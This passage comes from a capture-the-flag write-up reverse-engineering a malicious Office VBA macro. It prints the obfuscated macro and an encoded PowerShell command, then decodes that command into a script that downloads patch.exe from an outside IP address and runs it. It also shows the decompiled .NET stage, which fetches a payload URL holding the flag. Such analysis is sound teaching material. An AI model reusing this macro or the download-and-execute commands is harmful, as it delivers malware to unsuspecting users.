    qgCHXadDjflv = xDSnawULVynR(Array((38 + (74 - 37)), 158, (200 + 53), ((7 - 2) + 243), (60 + 141), 110, (((123 - 60) + (27 - 2)) Xor (107 - 49)), (11 + 33), (81 + 84)), Array((5 Xor 13), (56 + (171 - 63)), 161, 173, (119 Xor 205), (7 + (4 - 0)), ((15 + 0) Xor ((6 - 3) + 28)), ((80 - 36) Xor 115), 249)) + BotaCipUCROa + xDSnawULVynR(Array((93 - 20), 79, 41, (242 + 0), 26, 117, (59 Xor (26 + (111 - 37))), (375 - 166), ((27 + 6) Xor 110), (97 - 5), 208, 61, 37, ((83 - 34) Xor 97), 97), Array((((7 - 3) + (5 - 1)) Xor 29), 14, ((38 - 16) Xor 79), 130, 94, (10 + 10), ((3 + (6 - 2)) Xor (49 - 5)), 176, (0 + (21 - 2)), 16, 191, ((2 - 1) + 93), 68, ((45 - 6) + 21), (39 + 22))) & _
                   xDSnawULVynR(Array(9, 140, 157, 249, (29 Xor 142), 166, (118 Xor 182), 23, ((16 - 0) Xor (6 + (77 - 38))), (50 + 74), ((27 + 37) Xor (242 - 67)), (((74 - 7) + 77) Xor 36), (3 Xor 146), (104 - 4), 207), Array((23 Xor (94 - 20)), (443 - 210), (148 + (132 - 40)), ((59 + 1) Xor 181), 207, ((0 + 56) Xor (78 + 164)), (308 - 147), ((55 - 7) + 50), ((14 + 69) Xor 0), 31, 135, (128 + 81), (434 - 207), 86, (368 - 143))) & _
                   xDSnawULVynR(Array((135 + (16 - 2)), 2, ((46 - 18) + 41)), Array((181 + 66), (22 + 77), (0 + 49)))
    Shell qgCHXadDjflv, vbHide
    Sleep (644 Xor 1364)
    Kill qgCHXadDjflv
End Sub
```

We can identify a few interesting parts:

```vba
' In LwvYeveWxaeE, a file is created.
Dim nThptKQUsbXIUwo As Object
Set nThptKQUsbXIUwo = OWbxyThhGwxilR.CreateTextFile(qgCHXadDjflv)
nThptKQUsbXIUwo.Write MwIMnegwljrXk

' In XEFxqSzaXCXvSAp, that file is spawned as a process (same variable: qgCHXadDjflv).
Shell qgCHXadDjflv, vbHide
Sleep (644 Xor 1364)
Kill qgCHXadDjflv
```

Let's try to see what's written in the file. Since I'm more comfortable with python, I converted the code using [this tool](http://vb2py.sourceforge.net/online_conversion.html). Note that I had to download [the source code](http://vb2py.sourceforge.net/downloads.html) to make the script run, since the package wouldn't install using `pip` for me.

Trying to run the converted code does nothing, since we have to call a function. Let's call `LwvYeveWxaeE`, which creates the file:

```bash
$ python converted.py 
Traceback (most recent call last):
  File "/home/vivescere/ctf/the-document-is-strange/test/converted.py", line 89, in <module>
    LwvYeveWxaeE()
  File "/home/vivescere/ctf/the-document-is-strange/test/converted.py", line 53, in LwvYeveWxaeE
    BotaCipUCROa = Application.UserName
NameError: name 'Application' is not defined
```

Now if we look a bit further up, at this point what's being written to the file is already created. Let's print it:

```python
...
    print(MwIMnegwljrXk)
    return
    BotaCipUCROa = Application.UserName
...
```

```bash
$ python converted.py 
powershell.exe -exec bypass -enc JABQAHIAbwBjAE4AYQBtAGUAIAA9ACAAIgBwAGEAdABjAGgALgBlAHgAZQAiAA0ACgAkAFcAZQBiAEYAaQBsAGUAIAA9ACAAIgBoAHQAdABwADoALwAvADEANQAyAC4AMgAyADgALgAxADMAMwAuADYAOAAvACQAUAByAG8AYwBOAGEAbQBlACIADQAKACAADQAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAFcAZQBiAEYAaQBsAGUALAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAKAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA==
```

An encoded powershell command! Let's decode it:

```bash
$ echo 'JABQAHIAbwBjAE4AYQBtAGUAIAA9ACAAIgBwAGEAdABjAGgALgBlAHgAZQAiAA0ACgAkAFcAZQBiAEYAaQBsAGUAIAA9ACAAIgBoAHQAdABwADoALwAvADEANQAyAC4AMgAyADgALgAxADMAMwAuADYAOAAvACQAUAByAG8AYwBOAGEAbQBlACIADQAKACAADQAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAFcAZQBiAEYAaQBsAGUALAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAKAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA==' | base64 -d
$ProcName = "patch.exe"
$WebFile = "http://152.228.133.68/$ProcName"
 
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
Start-Process ("$env:APPDATA\$ProcName")
```

OK so a `patch.exe` file is downloaded, and executed. Let's take a look:

```bash
$ wget http://152.228.133.68/patch.exe
$ file patch.exe
patch.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

It's a .NET program, we can use [ILSpy](https://github.com/icsharpcode/ILSpy) to analyze it. It only contains a bit of code:

```cs
// @Ӕ
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

internal class @Ӕ
{
	[DllImport("kernel32.dll", EntryPoint = "GetConsoleWindow")]
	private static extern IntPtr @ӓ();

	[DllImport("user32.dll", EntryPoint = "ShowWindow")]
	private static extern bool @Ӕ(IntPtr @ӓ, int @Ӕ);

	private static void Main(string[] args)
	{
		@Ӕ(@ӓ(), 0);
		Thread.Sleep(30000);
		Console.WriteLine("http://152.228.133.68/staged_payload.txt");
		WebRequest webRequest = WebRequest.Create("http://152.228.133.68/staged_payload.txt");
		webRequest.Method = "GET";
		Console.WriteLine(new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd());
	}
}

```

Let's take a look at that payload:

```bash
$ curl http://152.228.133.68/staged_payload.txt
CYBERTF{M4cr0_D0wnl0ad3r_1s_D0wn}
```

Here we go, the flag is `CYBERTF{M4cr0_D0wnl0ad3r_1s_D0wn}`.

You can [view the sources on github](https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/the-document-is-strange) or [read other writeups](/blog/cyber-threat-force-ctf/).
